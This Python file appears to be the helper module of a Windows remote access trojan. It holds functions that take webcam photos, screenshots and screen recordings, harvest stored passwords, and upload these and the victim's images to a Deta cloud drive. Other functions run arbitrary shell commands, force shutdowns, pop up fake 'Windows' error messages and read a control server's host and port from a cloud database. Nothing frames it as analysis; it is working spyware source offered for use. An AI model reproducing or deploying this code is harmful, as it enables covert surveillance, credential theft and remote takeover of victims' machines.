import os
from gtts import gTTS
from playsound import playsound
from deta import Deta
import tkinter as tk
import glob
import PIL.ImageGrab
import io
import subprocess
from tkinter import messagebox
import numpy as np
import cv2
import datetime
import ctypes
from get_pswd import pswd_to_txt

DETA_KEY = "<YOUR-DETA-SECRET-KEY>"

deta = Deta(DETA_KEY)
wallpaper = deta.Drive("wallpaper")

photos = deta.Drive("images")
db = deta.Base('IPaddress')


def shutdown():
    os.system('shutdown /p /f')

def cd(path):
    os.chdir(path)

def c_wallpaper():
    path = os.path.dirname(os.path.abspath(__file__))
    img = wallpaper.get('wallpaper.jpg')
    with open(path+'\wallpaper.jpg','wb') as f:
        f.write(img.read())
    ctypes.windll.user32.SystemParametersInfoW(20, 0, path+'\wallpaper.jpg' , 0)


def cap_img():
    cap = cv2.VideoCapture(0)
    ret,img = cap.read()
    cap.release()
    suc,endc_img = cv2.imencode('.png',img)
    by_img = endc_img.tobytes()
    photos.put(f'captured {datetime.datetime.now()}.png',by_img)

def pswd():
    f = pswd_to_txt()
    photos.put(f'pswds {os.environ["USERNAME"]}.txt',f.getvalue())


def list_files():
    return os.listdir(os.getcwd())
    
def speak(txt):
    language = 'te'
    myobj = gTTS(text=txt, lang=language, slow=False)
    myobj.save("welcome.mp3")
    playsound('welcome.mp3')
    

def send_images(num):
        files = ls_imgs()
        for i in range(num):
            with open(files[i],'rb') as f:
                name = os.path.basename(files[i])
                photos.put(name,f)

def ls_imgs():
    return glob.glob(cwd() +'**/*.png') + glob.glob(cwd() +'**/*.jpg') + glob.glob(cwd() +'**/*.JPG')

def upload_s(names):
    for i in names:
        with open(i,'rb') as f:
            name = os.path.basename(i)
            photos.put(name,f)
    
def screen_record(ti,conn):
    try:
        i = PIL.ImageGrab.grab()
        arr =  np.array(i).shape
        SCREEN_SIZE = (arr[1], arr[0])
        # define the codec
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        # create the video write object
        file_name = r'screenrecord_{}.avi'.format(str(datetime.datetime.now()))

        out = cv2.VideoWriter('output.avi', fourcc, 20.0, (SCREEN_SIZE))
        for i in range(ti+10):
            # make a screenshot
            img = PIL.ImageGrab.grab()
            # convert these pixels to a proper numpy array to work with OpenCV
            frame = np.array(img)
            # convert colors from BGR to RGB
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            # write the frame
            out.write(frame)
        
        out.release()   
        with open('output.avi','rb') as f:
            photos.put(file_name,f)
        os.remove('output.avi')
        conn.sendall('Recording Uploaded'.encode())
        
    except Exception as e:
        conn.sendall(str(e).encode())
        print(e)
        

    
        
def cwd():
    return os.getcwd()

def show_Msg(msg):

    root = tk.Tk()
    root.withdraw()
    messagebox.showerror("Windows", msg)

def screenshot():
    img = PIL.ImageGrab.grab()
    output = io.BytesIO()
    img.save(output, format='JPEG')
    photos.put(r'Screenshot_{}.jpeg'.format(str(datetime.datetime.now())),output.getvalue())

def get_host():
    g = db.fetch().items[0]
    return g['host'],g['port']


def exe(cmd):
    
    out,err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL,shell=True).communicate()
    return out
    

